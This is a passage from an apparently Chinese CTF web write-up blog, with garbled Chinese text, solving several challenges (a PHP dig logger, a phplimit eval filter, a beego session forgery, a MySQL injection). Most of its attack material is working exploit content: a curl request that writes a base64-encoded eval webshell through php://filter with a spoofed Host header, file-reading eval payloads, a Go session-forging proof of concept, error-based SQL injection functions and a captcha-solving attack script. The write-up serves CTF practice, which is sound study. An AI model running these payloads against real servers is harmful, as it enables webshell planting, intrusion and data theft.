class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;read-source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DATA_DIR&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/data/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(DATA_DIR)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(DATA_DIR, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(DATA_DIR);</span><br><span class="line"></span><br><span class="line"><span class="variable">$domain</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;domain&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;domain&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$log_name</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;log&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;log&#x27;</span>] : <span class="title function_ invoke__">date</span>(<span class="string">&#x27;-Y-m-d&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;!-- Required meta tags --&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Bootstrap CSS --&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css&quot;</span> integrity=<span class="string">&quot;sha256-eSi1q2PG6J7g7ib17yAaWMcrr5GrtohYChqibrV7PBE=&quot;</span> crossorigin=<span class="string">&quot;anonymous&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;Domain Detail&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    pre &#123;</span><br><span class="line">        width: <span class="number">100</span>%;</span><br><span class="line">        background-color: <span class="comment">#f6f8fa;</span></span><br><span class="line">        border-radius: <span class="number">3</span>px;</span><br><span class="line">        font-size: <span class="number">85</span>%;</span><br><span class="line">        line-height: <span class="number">1.45</span>;</span><br><span class="line">        overflow: auto;</span><br><span class="line">        padding: <span class="number">16</span>px;</span><br><span class="line">        border: <span class="number">1</span>px solid <span class="comment">#ced4da;</span></span><br><span class="line">    &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">group</span> <span class="title">mt</span>-3&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">group</span>-<span class="title">prepend</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">group</span>-<span class="title">text</span>&quot; <span class="title">id</span>=&quot;<span class="title">basic</span>-<span class="title">addon1</span>&quot;&gt;<span class="title">dig</span> -<span class="title">t</span> <span class="title">A</span> -<span class="title">q</span>&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">domain</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Your</span> <span class="title">domain</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">group</span>-<span class="title">append</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">outline</span>-<span class="title">secondary</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;æ‰§è¡Œ&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">pre</span> <span class="title">class</span>=&quot;<span class="title">mt</span>-3&quot;&gt;&lt;?<span class="title">php</span> <span class="title">if</span>(!<span class="title">empty</span>($<span class="title">_POST</span>) &amp;&amp; $<span class="title">domain</span>):</span></span><br><span class="line"><span class="class">                $<span class="title">command</span> = <span class="title">sprintf</span>(&quot;<span class="title">dig</span> -<span class="title">t</span> <span class="title">A</span> -<span class="title">q</span> %<span class="title">s</span>&quot;, <span class="title">escapeshellarg</span>($<span class="title">domain</span>));</span></span><br><span class="line"><span class="class">                $<span class="title">output</span> = <span class="title">shell_exec</span>($<span class="title">command</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                $<span class="title">output</span> = <span class="title">htmlspecialchars</span>($<span class="title">output</span>, <span class="title">ENT_HTML401</span>  <span class="title">ENT_QUOTES</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                $<span class="title">log_name</span> = $<span class="title">_SERVER</span>[&#x27;<span class="title">SERVER_NAME</span>&#x27;] . $<span class="title">log_name</span>;</span></span><br><span class="line"><span class="class">                <span class="title">if</span>(!<span class="title">in_array</span>(<span class="title">pathinfo</span>($<span class="title">log_name</span>, <span class="title">PATHINFO_EXTENSION</span>), [&#x27;<span class="title">php</span>&#x27;, &#x27;<span class="title">php3</span>&#x27;, &#x27;<span class="title">php4</span>&#x27;, &#x27;<span class="title">php5</span>&#x27;, &#x27;<span class="title">phtml</span>&#x27;, &#x27;<span class="title">pht</span>&#x27;], <span class="title">true</span>)) </span>&#123;</span><br><span class="line">                    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$log_name</span>, <span class="variable">$output</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">            <span class="keyword">endif</span>; <span class="meta">?&gt;</span>&lt;/pre&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><h2 id="æ€è·¯-2">æ€è·¯</h2><p>ç®€å•å®¡è®¡ä¸€ä¸‹,å‘ç°å¯ä»¥æŠŠdigçš„ç»“æœå­˜åˆ°ä¸€ä¸ªæ–‡ä»¶,é‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥å†™shell,åé¢è¿›è¡Œäº†ä¸€ä¸ªç®€å•çš„åˆ¤æ–­,ç„¶åç”¨<code>file_put_contents</code>æ¥å†™æ–‡ä»¶,ç®€å•æµ‹è¯•ä¸€ä¸‹ <a href="/images/2018/11/2018-12-06-17-14-32-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/11/2018-12-06-17-14-32-åˆ›å»ºçš„æˆªå›¾.png" /></a> é‚£ä¹ˆå†™æ–‡ä»¶å°±ä¸æˆé—®é¢˜äº†,é‚£ä¹ˆé—®é¢˜æ˜¯æ€ä¹ˆå†™shellå‘¢? å°–æ‹¬å·éƒ½ä¼šè¢«è½¬ä¹‰æ‰,è¿™é‡Œæœ¬æ¥è€ƒè™‘åˆ°äº†ä¼ªåè®®çš„é—®é¢˜,ä¸è¿‡å¡åœ¨äº†<code>$_SERVER['SERVER_NAME']</code>çš„ç»•è¿‡ åæ¥çœ‹åˆ° <a href="/images/2018/11/2018-12-06-17-26-38-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/11/2018-12-06-17-26-38-åˆ›å»ºçš„æˆªå›¾.png" /></a> è¿˜æ˜¯ä¸å¤ªæ˜ç™½,çœ‹çœ‹è‹±æ–‡ç‰ˆ</p><blockquote><p>'SERVER_NAME' The name of the server host under which the current script is executing. If the script is running on a virtual host, this will be the value defined for that virtual host. Note: Under Apache 2, you must set UseCanonicalName = On and ServerName. Otherwise, this value reflects the hostname supplied by the client, which can be spoofed. It is not safe to rely on this value in security-dependent contexts.</p></blockquote><p>å‘ç°å¯ä»¥ç”±hostnameä¼ªé€ ,è¯•è¯•çœ‹æ”¹host <a href="/images/2018/11/2018-12-06-17-30-43-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/11/2018-12-06-17-30-43-åˆ›å»ºçš„æˆªå›¾.png" /></a> é‚£ä¹ˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$log_name</span>, <span class="variable">$output</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª<code>log_name</code>å°±æ˜¯å¯æ§çš„,ä»è€Œå¯ä»¥é€šè¿‡ä¼ªåè®®å†™shell ç”¨ä¼ªåè®®çš„æ—¶å€™å°†<code>domain</code>ç»™baseä¸€ä¸‹,ç„¶åæ§åˆ¶<code>log_name</code>æ¥è§£base,ä»è€Œè¿˜åŸshell æ³¨æ„baseçš„æ—¶å€™padåˆ°å­—ç¬¦æ˜¯4çš„å€æ•°,æˆ‘è¿™é‡Œå¤šè¯•äº†å‡ æ¬¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -d <span class="string">&#x27;domain=PD9waHAKZXZhbCgkX0dFVFsnYmxhY3NoZWVwJ10pOwo/Pg&amp;log=://filter/write=convert.base64-decode/resource=blacsheep3.php/.&#x27;</span> -H <span class="string">&quot;Host: php&quot;</span> <span class="string">&#x27;http://51.158.75.42:8082/&#x27;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ‹¿åˆ°shell <a href="/images/2018/11/2018-12-06-18-15-03-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/11/2018-12-06-18-15-03-åˆ›å»ºçš„æˆªå›¾.png" /></a></p><h1 id="easy---phplimit">easy - phplimit</h1><h2 id="æºç -3">æºç </h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^W]+((?R)?)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åˆ†æ">åˆ†æ</h2><p>2018rctfçš„r-cursiveçš„ä¸€éƒ¨åˆ† å‚è€ƒ:<a href="https://xz.aliyun.com/t/2347" title="https://xz.aliyun.com/t/2347">https://xz.aliyun.com/t/2347</a> çœ‹åˆ°ä»–ä»¬ä¹‹å‰çš„payload å°è¯•getallheadersä½†æ˜¯å¤±è´¥äº†,åˆçœ‹åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=print(readdir(opendir(getcwd()))); å¯ä»¥åˆ—ç›®å½•</span><br><span class="line">?cmd=print(readfile(readdir(opendir(getcwd())))); è¯»æ–‡ä»¶</span><br><span class="line">?cmd=print(dirname(dirname(getcwd()))); printå‡º/var/www</span><br></pre></td></tr></table></figure><p>ç¨ä½œä¿®æ”¹,è·å¾—ä¸‹é¢çš„payload <a href="http://51.158.75.42:8084/?code=print_r%28readfile%28array_rand%28array_flip%28scandir%28dirname%28chdir%28dirname%28getcwd%28%29%29%29%29%29%29%29%29%29%3B" title="http://51.158.75.42:8084/?code=print_r%28readfile%28array_rand%28array_flip%28scandir%28dirname%28chdir%28dirname%28getcwd%28%29%29%29%29%29%29%29%29%29%3B">http://51.158.75.42:8084/?code=print_r%28readfile%28array_rand%28array_flip%28scandir%28dirname%28chdir%28dirname%28getcwd%28%29%29%29%29%29%29%29%29%29%3B</a> å› ä¸ºè®¾è®¡åˆ°array_rand,æ‰€ä»¥åªæ˜¯å¯èƒ½æ‹¿åˆ°flag... å¤šåˆ·å‡ æ¬¡å°±å¥½,ä¸»è¦è¿˜æ˜¯é€šè¿‡dirnameè·å–ç›®å½•æ¥è¿›è¡Œè¿”å› åæ¥çœ‹äº†ä¸€æ³¢wp.. ä¸¤ç§æ–¹æ³•</p><h3 id="get_defined_vars">get_defined_vars</h3><p><a href="/images/2018/11/2018-12-06-19-20-59-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/11/2018-12-06-19-20-59-åˆ›å»ºçš„æˆªå›¾.png" /></a> æ‰€ä»¥ç›´æ¥ç”¨å°±å¥½ <a href="/images/2018/11/2018-12-06-19-31-33-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/11/2018-12-06-19-31-33-åˆ›å»ºçš„æˆªå›¾.png" /></a> æ³¨æ„æŠŠa(å‘½ä»¤å‚æ•°)æ”¾åœ¨å‰é¢,æ–¹ä¾¿æ‰§è¡Œçš„æ—¶å€™å…ˆæ‰§è¡Œç„¶ååŠ æ³¨é‡Š,ä¸ç„¶æ‰§è¡Œä¸äº†å‘½ä»¤,æ¯”å¦‚<code>scandir()</code>å°±ä¼šçˆ†å†…å­˜ ç„¶åæ‹¿åˆ°flag <a href="/images/2018/11/2018-12-06-19-35-07-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/11/2018-12-06-19-35-07-åˆ›å»ºçš„æˆªå›¾.png" /></a></p><h3 id="å¦ä¸€ç§ç»•è¿‡">å¦ä¸€ç§ç»•è¿‡</h3><p><code>code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code> ç”¨çš„<code>array_reverse()</code>å’Œ<code>next()</code>ç»•è¿‡çš„</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BCTF2018web(part1)</title>
      <link href="/2018/11/29/bctf2018webpart1/"/>
      <url>/2018/11/29/bctf2018webpart1/</url>
      
        <content type="html"><![CDATA[<h2 id="checkin">checkin</h2><p>goçš„sessionidæ²¡æœ‰è¿‡æ»¤<code>./</code>çš„æ—¶å€™å¯¼è‡´å¯ä»¥ç”¨ä»»æ„æ–‡ä»¶ä½œä¸ºsession,å¯ä»¥åœ¨githubä¸Šé¢çœ‹Nov11çš„commit <a href="https://github.com/astaxie/beego/pull/3383" title="https://github.com/astaxie/beego/pull/3383">https://github.com/astaxie/beego/pull/3383</a> go-macaron(https://github.com/go-macaron/session version&lt;0.4.0) beego(https://github.com/astaxie/beego version&lt;1.11.0)éƒ½å­˜åœ¨è¿™ä¸ªæ´ ç»™å‡ºä¸€ä¸ªå¤–å›½é€‰æ‰‹çš„poc</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;github.com/astaxie/beego/session&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    s := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">    s[<span class="string">&quot;username&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    s[<span class="string">&quot;UID&quot;</span>] = <span class="number">1</span></span><br><span class="line">    encoded_s, err:= session.EncodeGob(s)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    log.Printf(<span class="string">&quot;%v&quot;</span>, encoded_s)</span><br><span class="line">    decoded_s, err := session.DecodeGob(encoded_s)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    log.Printf(<span class="string">&quot;%v&quot;</span>, decoded_s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·‘ä¸€ä¸‹poc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@Macbook:/home/blacsheep/Tools/MyWebTools/gogs  $ go run hatena_poc.go </span><br><span class="line">2018/11/29 19:37:16 [14 255 129 4 1 2 255 130 0 1 16 1 16 0 0 61 255 130 0 2 6 115 116 114 105 110 103 12 10 0 8 117 115 101 114 110 97 109 101 6 115 116 114 105 110 103 12 7 0 5 97 100 109 105 110 6 115 116 114 105 110 103 12 5 0 3 85 73 68 3 105 110 116 4 2 0 2]</span><br><span class="line">2018/11/29 19:37:16 map[username:admin UID:1]</span><br></pre></td></tr></table></figure><p>ä¸¢åˆ°cyberchefçš„fromdecimal <a href="https://gchq.github.io/CyberChef/#recipe=From_Decimal(&#39;Space&#39;,false)&amp;input=MTQgMjU1IDEyOSA0IDEgMiAyNTUgMTMwIDAgMSAxNiAxIDE2IDAgMCA2MSAyNTUgMTMwIDAgMiA2IDExNSAxMTYgMTE0IDEwNSAxMTAgMTAzIDEyIDEwIDAgOCAxMTcgMTE1IDEwMSAxMTQgMTEwIDk3IDEwOSAxMDEgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA3IDAgNSA5NyAxMDAgMTA5IDEwNSAxMTAgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA1IDAgMyA4NSA3MyA2OCAzIDEwNSAxMTAgMTE2IDQgMiAwIDI" title="https://gchq.github.io/CyberChef/#recipe=From_Decimal(&#39;Space&#39;,false)&amp;input=MTQgMjU1IDEyOSA0IDEgMiAyNTUgMTMwIDAgMSAxNiAxIDE2IDAgMCA2MSAyNTUgMTMwIDAgMiA2IDExNSAxMTYgMTE0IDEwNSAxMTAgMTAzIDEyIDEwIDAgOCAxMTcgMTE1IDEwMSAxMTQgMTEwIDk3IDEwOSAxMDEgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA3IDAgNSA5NyAxMDAgMTA5IDEwNSAxMTAgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA1IDAgMyA4NSA3MyA2OCAzIDEwNSAxMTAgMTE2IDQgMiAwIDI">https://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)&amp;input=MTQgMjU1IDEyOSA0IDEgMiAyNTUgMTMwIDAgMSAxNiAxIDE2IDAgMCA2MSAyNTUgMTMwIDAgMiA2IDExNSAxMTYgMTE0IDEwNSAxMTAgMTAzIDEyIDEwIDAgOCAxMTcgMTE1IDEwMSAxMTQgMTEwIDk3IDEwOSAxMDEgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA3IDAgNSA5NyAxMDAgMTA5IDEwNSAxMTAgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA1IDAgMyA4NSA3MyA2OCAzIDEwNSAxMTAgMTE2IDQgMiAwIDI</a> å­˜ä¸ªpoc.jpg,ä¸Šä¼ æ”¹session,ç™»å½•åˆ°admin <a href="/images/2018/11/2018-11-29-19-42-20å±å¹•æˆªå›¾.png"><img src="/images/2018/11/2018-11-29-19-42-20å±å¹•æˆªå›¾.png" /></a> ç„¶åadminpanelæ‹¿åˆ°flag <a href="/images/2018/11/2018-11-29-19-42-38-åˆ›å»ºçš„æˆªå›¾.png"><img src="/images/2018/11/2018-11-29-19-42-38-åˆ›å»ºçš„æˆªå›¾.png" /></a></p><h2 id="babysqlispa">babySQLiSPA</h2><p>/api/hintså¯ä»¥æ³¨å…¥ éš¾ç‚¹æ˜¯ç»•è¿‡ mysqlç‰ˆæœ¬5.7.24,å¤§å¤šæ•°å‡ ä½•å‡½æ•°æ— æ³•ä½¿ç”¨.polygonå¯ä»¥çˆ†åº“åå’Œè¡¨å,ä½†æ˜¯æ²¡ç”¨,å¾—å»æ‰¾flagè¡¨ è¿™é‡Œmysql5.7ä¹‹åæ–°å¢çš„æŠ¥é”™å‡½æ•°æœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ST_LatFromGeoHash()</span><br><span class="line">    select ST_LatFromGeoHash(version());</span><br><span class="line">ST_LongFromGeoHash()</span><br><span class="line">    select ST_LongFromGeoHash(version());</span><br><span class="line">GTID_SUBSET()</span><br><span class="line">    select GTID_SUBSET(version(),1);</span><br><span class="line">GTID_SUBTRACT()</span><br><span class="line">    select GTID_SUBTRACT(version(),1);</span><br><span class="line">ST_PointFromGeoHash()</span><br><span class="line">    select ST_PointFromGeoHash(version(),1);</span><br></pre></td></tr></table></figure><p>éœ€è¦è¿‡çš„waf</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">checkHint</span> (hint) &#123;</span><br><span class="line"> <span class="keyword">return</span> ! <span class="regexp">/ ;\+-\*\/</span></span><br><span class="line"><span class="regexp">&lt;&gt;~!\d%\x09\x0a\x0b\x0c\x0d`gtid_subsethashjsonst\_updatexm</span></span><br><span class="line"><span class="regexp">lextractvaluefloorrandexpjson_keysuuid_to_binbin_to_uuidunionlike</span></span><br><span class="line"><span class="regexp">sleepbenchmark/ig</span>.<span class="title function_">test</span>(hint)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">u=requests.session()</span><br><span class="line">data= &#123;<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;blacsheep11&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;blacsheep11&#x27;</span>&#125;</span><br><span class="line">r=u.post(<span class="string">&#x27;http://47.93.100.42:9999/api/login&#x27;</span>,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">src</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(src).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">src</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000000</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(i)[:<span class="number">6</span>]==<span class="built_in">str</span>(src):</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r=u.get(<span class="string">&#x27;http://47.93.100.42:9999/api/captcha&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    prefix= re.findall(<span class="string">r&#x27;&quot;captcha&quot;:&quot;(.&#123;6&#125;)&quot;&#125;&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">    captcha = calc(prefix)</span><br><span class="line">    hint=<span class="built_in">input</span>(<span class="string">&#x27;hints:&#x27;</span>)</span><br><span class="line">    data=&#123;<span class="string">&#x27;captcha&#x27;</span>:captcha,<span class="string">&#x27;hint&#x27;</span>:hint&#125;</span><br><span class="line">    r=u.post(<span 